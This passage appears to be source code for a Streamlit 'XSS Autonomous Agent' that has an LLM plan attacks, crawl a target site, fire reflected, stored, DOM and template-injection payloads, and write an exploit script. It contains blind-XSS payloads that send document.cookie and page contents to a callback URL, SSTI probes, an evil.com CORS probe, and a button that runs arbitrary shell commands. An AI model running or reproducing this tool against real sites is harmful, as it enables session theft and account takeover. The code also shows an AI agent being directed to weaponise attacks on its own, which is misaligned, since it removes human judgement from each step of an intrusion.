        return f"# Error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
# AI: REPORT
# ══════════════════════════════════════════════════════════════════════════════
def ai_full_report(client, findings, pages, target, dom_sinks,
                   infra, template_engine, pm_handlers, advanced_hits) -> str:
    surface = {
        "pages": len(pages),
        "forms": sum(len(p["forms"]) for p in pages),
        "url_params": sum(len(p["params"]) for p in pages),
        "dom_sinks": len(dom_sinks),
        "waf": infra.get("waf", "none"),
        "csp": infra.get("csp", "NONE"),
        "csp_bypasses": infra.get("csp_bypasses", []),
        "cors_vuln": infra.get("cors_vuln", "none"),
        "cookie_issues": infra.get("cookie_issues", []),
        "tech": infra.get("tech", []),
        "vuln_libs": infra.get("vuln_libs", []),
        "template_engine": template_engine or "none",
        "header_issues": infra.get("header_issues", []),
        "urls": [p["url"] for p in pages[:10]],
    }
    all_findings = findings + advanced_hits

    if all_findings:
        fsum = json.dumps([{
            "url": f["url"], "param": f["param"], "payload": f["payload"],
            "method": f["method"], "context": f.get("context", ""),
            "browser_confirmed": f.get("browser_confirmed", False),
            "html_changed": f.get("html_changed", False),
            "severity": f.get("severity", "HIGH"),
            "snippet": f.get("body_snippet", "")[:200],
        } for f in all_findings[:10]], indent=2)

        prompt = f"""Senior penetration tester. Write a comprehensive security report.

Target: {target}
Findings ({len(all_findings)} total):
{fsum}

Attack surface:
{json.dumps(surface, indent=2)}

DOM sinks:
{chr(10).join(dom_sinks[:10])}

Report sections:

## Executive Summary
Risk rating (Critical/High/Medium). Business impact (non-technical).

## Confirmed Vulnerabilities
For each:
- Type + CVSS 3.1 score + vector string
- Exact URL, param, method, context
- Working payload
- Was HTML actually mutated in the browser? (yes/no + what changed)
- Concrete real-world attack scenario
- curl PoC command

## Modern Attack Surface
Based on what was found: DOM sinks, postMessage, JSONP, prototype pollution, CSP bypasses, CORS.
For each: exact pattern, attack vector, payload.

## Attack Chains
- XSS → session hijack → account takeover
- HTML injection → phishing overlay → credential harvest
- CORS + XSS → cross-origin data theft
- Prototype pollution → property injection → XSS

## CSP & Defense Analysis
What's missing, what bypasses exist.

## Remediation (priority-ordered, with code examples)

## Immediate Next Steps (copy-paste curl/Python commands)"""
    else:
        prompt = f"""Senior penetration tester. No direct confirmations. Write a zero-day hunting guide.

Target: {target}
Attack surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:10])}

Write:
## Attack Surface Assessment
## Why Testing Found Nothing (Root Cause)
## DOM XSS Zero-Day Hunt (specific sinks, payloads, steps)
## Modern Attack Vectors (DOM clobbering, import maps, trusted types bypass)
## Blind XSS Plan (which forms, exact payloads)
## Manual Commands (copy-paste ready)"""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS, temperature=0.2,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
# DETECT TEMPLATE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
def _detect_template_engine(pages: list) -> tuple:
    combined = " ".join(p["html"] for p in pages[:4])
    for engine, sigs in TEMPLATE_ENGINES.items():
        for sig in sigs:
            if re.search(sig, combined, re.I):
                ssti = [
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
                    "{{config.items()}}", "{{request.environ}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                ]
                return engine, ssti
    return "", []


# ══════════════════════════════════════════════════════════════════════════════
# AGENT ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════
def run_agent(target, user_payload, max_depth, blind_url, term_ph, stats_phs):
    client = get_client()
    L = lambda msg, kind="info": log(msg, kind, term_ph, stats_phs)

    L(f"Target  : {target}")
    L(f"Payload : {user_payload}")
    L(f"Depth   : {max_depth}")
    if blind_url:
        L(f"Blind   : {blind_url}", "blind")
    L("━" * 50)

    # ── PHASE 0 — Infrastructure Recon ─────────────────────────────────────
    L("PHASE 0 — INFRASTRUCTURE RECON", "infra")
    infra = phase0_infrastructure(target, term_ph, stats_phs)
    st.session_state.infra = infra

    # ── PHASE 0.5 — AI Attack Planning ─────────────────────────────────────
    L("━" * 50)
    L("PHASE 0.5 — AI ATTACK PLANNING", "plan")
    plan = phase05_plan_attack(client, target, infra, user_payload, term_ph, stats_phs)
    st.session_state.attack_plan = plan.get("attack_summary", "")

    # ── PHASE 1 — Crawl ─────────────────────────────────────────────────────
    L("━" * 50)
    L("PHASE 1 — CRAWL (seeded with robots.txt disallowed paths)", "info")
    pages = crawl(target, max_depth,
                  infra.get("robots_disallowed", []),
                  term_ph, stats_phs)
    L(f"Crawl done — {len(pages)} pages | "
      f"{sum(len(p['forms']) for p in pages)} forms | "
      f"{sum(len(p['params']) for p in pages)} URL params | "
      f"{len({ep for p in pages for ep in p.get('js_endpoints',[])})} JS endpoints", "ok")

    all_sinks = list(dict.fromkeys(s for p in pages for s in p.get("dom_sinks", [])))[:20]
    st.session_state.dom_sinks = all_sinks
    if all_sinks:
        L(f"DOM sinks: {len(all_sinks)} found", "dom")
        for s in all_sinks[:4]:
            L(f"  {s[:100]}", "dom")

    pm_handlers = [h for p in pages for h in p.get("postmessage_handlers", [])]
    unsafe_pm   = [h for h in pm_handlers if h.get("no_origin_check")]
    if unsafe_pm:
        L(f"⚠️  {len(unsafe_pm)} postMessage handlers WITHOUT origin check!", "warn")

    all_jsonp = [ep for p in pages for ep in p.get("jsonp_endpoints", [])]
    if all_jsonp:
        L(f"JSONP endpoints: {len(all_jsonp)}", "warn")

    eng, ssti_payloads = _detect_template_engine(pages)
    if eng:
        L(f"Template engine: {eng} — SSTI payloads queued", "warn")

    # ── PHASE 2 — AI Payload Generation ─────────────────────────────────────
    L("━" * 50)
    L("PHASE 2 — AI PAYLOAD GENERATION", "ai")
    payloads = ai_generate_payloads(
        client, target, user_payload, infra, plan, all_sinks, eng, pages)
    payloads += ssti_payloads[:5]
    if blind_url:
        blind_payloads = [
            f'<img src=x onerror=fetch("{blind_url}?c="+document.cookie)>',
            f'"><img src=x onerror=fetch("{blind_url}?c="+document.cookie)>',
            f"'><script>fetch('{blind_url}?d='+btoa(document.cookie))</script>",
            f'<svg onload=fetch("{blind_url}?dom="+btoa(document.body.innerHTML.slice(0,500)))>',
        ]
        payloads = blind_payloads + payloads
    seen = set()
    payloads = [p for p in payloads if not (p in seen or seen.add(p))]
    L(f"Generated {len(payloads)} context-aware payloads (AI-ranked)", "ai")
    for i, pl in enumerate(payloads[:5], 1):
        L(f"  [{i}] {pl[:90]}", "cmd")

    focus_fields = plan.get("focus_fields", [])
    if focus_fields:
        L(f"Priority fields from plan: {focus_fields}", "plan")

    # ── PHASE 3 — Reflected XSS + HTML Mutation Verification ─────────────────
    L("━" * 50)
    L("PHASE 3 — REFLECTED XSS + HTML MUTATION VERIFY", "info")
    all_findings = []
    for page in pages:
        hits = test_page(page, payloads, focus_fields, term_ph, stats_phs)
        all_findings.extend(hits)
    confirmed_3 = [f for f in all_findings if f.get("browser_confirmed")]
    html_changed = [f for f in all_findings if f.get("html_changed")]
    L(f"Tested {st.session_state.points_found} injection pts | "
      f"{len(confirmed_3)} JS-confirmed | {len(html_changed)} HTML-mutated | "
      f"{len(all_findings)-len(confirmed_3)} reflected-only", "ok")

    # ── PHASE 3.5 — Stored XSS (fast) ────────────────────────────────────────
    L("━" * 50)
    L("PHASE 3.5 — STORED XSS HUNT (parallel, fast)", "hunt")
    stored_hits = hunt_stored_xss(pages, payloads, term_ph, stats_phs)
    if stored_hits:
        L(f"  {len(stored_hits)} stored XSS candidate(s)!", "vuln")
    else:
        L("  No stored XSS found", "info")
    all_findings += stored_hits

    # ── PHASE 4 — Advanced hunting (parallel where possible) ─────────────────
    L("━" * 50)
    L("PHASE 4 — ADVANCED ZERO-DAY HUNTING", "hunt")
    advanced_hits = []

    skip = plan.get("skip_phases", [])

    L("  › Cache poisoning (unkeyed headers)...", "hunt")
    advanced_hits += hunt_cache_poisoning(target, term_ph, stats_phs)

    L("  › CORS misconfiguration...", "hunt")
    advanced_hits += hunt_cors_xss(target, infra, term_ph, stats_phs)

    L("  › JSONP callback injection...", "hunt")
    advanced_hits += hunt_jsonp(pages, term_ph, stats_phs)

    L("  › Mutation XSS (mXSS — sanitizer bypass)...", "hunt")
    advanced_hits += hunt_mutation_xss(pages, plan, term_ph, stats_phs)

    L("  › HTTP header injection...", "hunt")
    advanced_hits += hunt_header_injection(target, term_ph, stats_phs)

    if "graphql" not in skip:
        L("  › GraphQL introspection + injection...", "hunt")
        advanced_hits += hunt_graphql(target, pages, term_ph, stats_phs)

    L("  › DOM XSS via browser (hash/search sources)...", "hunt")
    advanced_hits += hunt_dom_xss(pages, payloads, term_ph, stats_phs)

    if advanced_hits:
        L(f"Advanced hunt: {len(advanced_hits)} additional finding(s)", "ok")
    else:
        L("Advanced hunt: no additional vectors confirmed", "info")

    all_findings += advanced_hits
    st.session_state.findings = all_findings

    total_confirmed = len([f for f in all_findings if f.get("browser_confirmed")])
    total_html      = len([f for f in all_findings if f.get("html_changed")])
    L(f"Total: {len(all_findings)} findings | {total_confirmed} JS-confirmed | {total_html} HTML-mutated", "ok")

    # ── PHASE 5 — Exploit Script ─────────────────────────────────────────────
    if all_findings:
        L("━" * 50)
        L("PHASE 5 — WRITING EXPLOIT SCRIPT", "ai")
        exploit = ai_write_exploit(client, all_findings, target, blind_url)
        st.session_state.exploit_code = exploit
        L("Exploit script ready (see Exploit Code tab)", "ok")

    # ── PHASE 6 — Report ─────────────────────────────────────────────────────
    L("━" * 50)
    L("PHASE 6 — AI SECURITY REPORT", "ai")
    report = ai_full_report(client, all_findings, pages, target, all_sinks,
                            infra, eng, pm_handlers, advanced_hits)
    st.session_state.report = report
    L("Report complete", "ok")
    L("━" * 22 + " DONE " + "━" * 22, "ok")
    st.session_state.done    = True
    st.session_state.running = False


# ═══════════════════════════════════ UI ════════════════════════════════════════
st.markdown("""
<style>
[data-testid="stAppViewContainer"] { background: #0f111a; }
[data-testid="stHeader"] { background: #0f111a; }
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")

with st.container(border=True):
    st.subheader("🎯 Mission")
    c1, c2 = st.columns([3, 1])
    with c1:
        target_input = st.text_input("Target URL",
                                      value=st.session_state._last_target,
                                      placeholder="https://your-test-site.com")
    with c2:
        depth_input = st.slider("Crawl depth", 1, 5, int(st.session_state._last_depth))

    payload_input = st.text_area(
        "What to inject",
        value=st.session_state._last_payload,
        placeholder='<script>alert("owned")</script>  or  '
                    '<img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
        height=68,
    )
    blind_input = st.text_input(
        "Blind XSS callback URL (optional)",
        value=st.session_state._last_blind_url,
        placeholder="https://your-webhook.site/callback",
        help="Payloads will exfiltrate cookies/DOM to this URL",
    )
    ca, cb = st.columns([2, 1])
    with ca:
        start_btn = st.button("🚀 Launch Agent", type="primary",
                               use_container_width=True,
                               disabled=st.session_state.running)
    with cb:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            st.rerun()

# Stats bar
sc    = st.columns(5)
s_phs = tuple(col.empty() for col in sc)
_render_stats(*s_phs)

# Attack plan banner
if st.session_state.attack_plan:
    st.info(f"📋 **Attack Plan:** {st.session_state.attack_plan}")

# Terminal
term_ph = st.empty()
_draw_terminal(term_ph)

# Results tabs
tab1, tab2, tab3, tab4, tab5 = st.tabs([
    "📊 Findings & Report", "💻 Exploit Code",
    "🏗️ Infrastructure", "🔬 DOM Sinks", "🖥️ Manual Terminal"
])

with tab1:
    if st.session_state.findings:
        confirmed  = [f for f in st.session_state.findings if f.get("browser_confirmed")]
        html_mut   = [f for f in st.session_state.findings if f.get("html_changed") and not f.get("browser_confirmed")]
        reflected  = [f for f in st.session_state.findings if not f.get("browser_confirmed") and not f.get("html_changed")]
        if confirmed:
            st.error(f"🎯 {len(confirmed)} CONFIRMED — JS executed in Chromium")
        if html_mut:
            st.warning(f"🔀 {len(html_mut)} HTML MUTATED — page structure changed (no JS exec)")
        if reflected:
            st.info(f"⚠️ {len(reflected)} reflected (unescaped) — not browser-verified")

        for i, f in enumerate(st.session_state.findings, 1):
            ok        = f.get("browser_confirmed", False)
            html_chg  = f.get("html_changed", False)
            if ok:
                badge = "🎯 EXECUTED"
            elif html_chg:
                badge = "🔀 HTML MUTATED"
            else:
                badge = "⚠️ REFLECTED"
            label = f"#{i} {badge} [{f.get('context','?')}] {f['url'][:60]} — {f['param']}"
            with st.expander(label, expanded=(i == 1)):
                if ok:
                    st.success("✅ JavaScript executed in real Chromium"
                               + (f' — dialog: `{f["dialog_msg"]}`' if f.get("dialog_msg") else "")
                               + (f' — injected: `{f["injected_element"][:60]}`' if f.get("injected_element") else ""))
                elif html_chg:
                    st.warning(f"🔀 HTML MUTATED — {f.get('dom_diff','')}")
                else:
                    st.warning("Reflected unescaped — not browser-confirmed")
                if f.get("severity"):
                    st.info(f["severity"])
                st.code(f["payload"], language="html")
                c1, c2 = st.columns(2)
                with c1:
                    st.markdown(f"**URL:** `{f['url']}`  \n"
                                f"**Param:** `{f['param']}`  \n"
                                f"**Method:** `{f['method'].upper()}`")
                with c2:
                    st.markdown(f"**Context:** `{f.get('context','?')}`  \n"
                                f"**HTTP:** `{f.get('status','?')}`  \n"
                                f"**HTML changed:** `{f.get('html_changed', False)}`")
                if f.get("body_snippet"):
                    st.code(f["body_snippet"][:600], language="html")
                # Before/after screenshots
                if f.get("screenshot_before") and f.get("screenshot_after"):
                    sc1, sc2 = st.columns(2)
                    with sc1:
                        st.caption("Before injection")
                        st.image(f["screenshot_before"], use_container_width=True)
                    with sc2:
                        st.caption("After injection")
                        st.image(f["screenshot_after"], use_container_width=True)
                elif f.get("screenshot"):
                    st.image(f["screenshot"], caption="Proof screenshot", use_container_width=True)

    if st.session_state.get("report"):
        st.divider()
        st.subheader("📝 AI Security Report")
        st.markdown(st.session_state.report)

    if not st.session_state.done and not st.session_state.running:
        st.info("Launch the agent to see findings.")

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 AI-Generated Exploit Script")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit script appears after vulnerabilities are found.")

with tab3:
    infra = st.session_state.get("infra", {})
    if infra:
        st.subheader("🏗️ Infrastructure Fingerprint")
        c1, c2, c3 = st.columns(3)
        c1.metric("WAF", infra.get("waf") or "None")
        c2.metric("Server", infra.get("server") or "Unknown")
        c3.metric("Tech Stack", ", ".join(infra.get("tech", [])) or "Unknown")
        if infra.get("ips"):
            st.markdown(f"**IPs:** {', '.join(infra['ips'])}")
        if infra.get("csp"):
            st.markdown("**CSP:**")
            st.code(infra["csp"])
        if infra.get("csp_bypasses"):
            st.warning("**CSP bypass vectors:**")
            for b in infra["csp_bypasses"]:
                st.markdown(f"- {b}")
        if infra.get("cors_vuln"):
            st.error(f"**CORS vuln:** {infra['cors_vuln']}")
        if infra.get("cookie_issues"):
            st.warning("**Cookie issues:**")
            for ci in infra["cookie_issues"]:
                st.markdown(f"- {ci}")
        if infra.get("header_issues"):
            st.warning("**Security header issues:**")
            for hi in infra["header_issues"]:
                st.markdown(f"- {hi}")
        if infra.get("vuln_libs"):
            st.error("**Vulnerable JS libraries:**")
            for lib in infra["vuln_libs"]:
                st.markdown(f"- {lib}")
        if infra.get("robots_disallowed"):
            st.markdown("**Robots.txt disallowed paths:**")
            for p in infra["robots_disallowed"]:
                st.markdown(f"- `{p}`")
        if st.session_state.attack_plan:
            st.divider()
            st.subheader("📋 AI Attack Plan")
            st.info(st.session_state.attack_plan)
    else:
        st.info("Infrastructure data appears after a scan.")

with tab4:
    if st.session_state.dom_sinks:
        st.subheader(f"🔬 DOM Sinks ({len(st.session_state.dom_sinks)} found)")
        st.caption("These patterns process user-controllable data — prime DOM XSS targets.")
        for s in st.session_state.dom_sinks:
            st.code(s, language="javascript")
    else:
        st.info("DOM sinks appear after a scan.")

with tab5:
    st.subheader("Manual Command Runner")
    mc = st.text_input("Command", placeholder="curl -sIL https://target.com")
    if target_input:
        presets = {
            "Headers":    f"curl -sIL {target_input}",
            "CSP":        f"curl -sI {target_input} | grep -i content-security",
            "Cookies":    f"curl -sIL {target_input} | grep -i set-cookie",
            "WAF probe":  f'curl -s "{target_input}?q=%3Cscript%3Ealert(1)%3C/script%3E" -o /dev/null -w "%{{http_code}}"',
            "DOM dump":   f"curl -sL {target_input} | grep -oP '.{{0,50}}innerHTML.{{0,80}}'",
            "CORS check": f'curl -sI -H "Origin: https://evil.com" {target_input} | grep -i access-control',
            "Robots":     f"curl -sL {target_input}/robots.txt",
        }
        pcols = st.columns(len(presets))
        for i, (label, cmd) in enumerate(presets.items()):
            with pcols[i]:
                if st.button(label, use_container_width=True):
                    mc = cmd
    if st.button("▶ Run") and mc.strip():
        with st.spinner("Running..."):
            try:
                r   = subprocess.run(mc, shell=True, capture_output=True,
                                     text=True, timeout=30)
                out = (r.stdout + r.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT after 30s]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# ── Launch ─────────────────────────────────────────────────────────────────────
if start_btn:
    if not target_input.strip():
        st.warning("Enter a target URL.")
    elif not payload_input.strip():
        st.warning("Enter what you want to inject.")
    else:
        st.session_state.update({
            "_last_target":   target_input.strip(),
            "_last_payload":  payload_input.strip(),
            "_last_depth":    depth_input,
            "_last_blind_url":blind_input.strip(),
            "running": True, "done": False,
            "log": [], "findings": [], "dom_sinks": [],
            "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
            "exploit_code": "", "report": "", "waf_detected": "",
            "infra": {}, "attack_plan": "",
        })
        st.rerun()

if st.session_state.running and not st.session_state.done:
    run_agent(
        st.session_state._last_target,
        st.session_state._last_payload,
        int(st.session_state._last_depth),
        st.session_state._last_blind_url,
        term_ph, s_phs,
    )
    st.rerun()
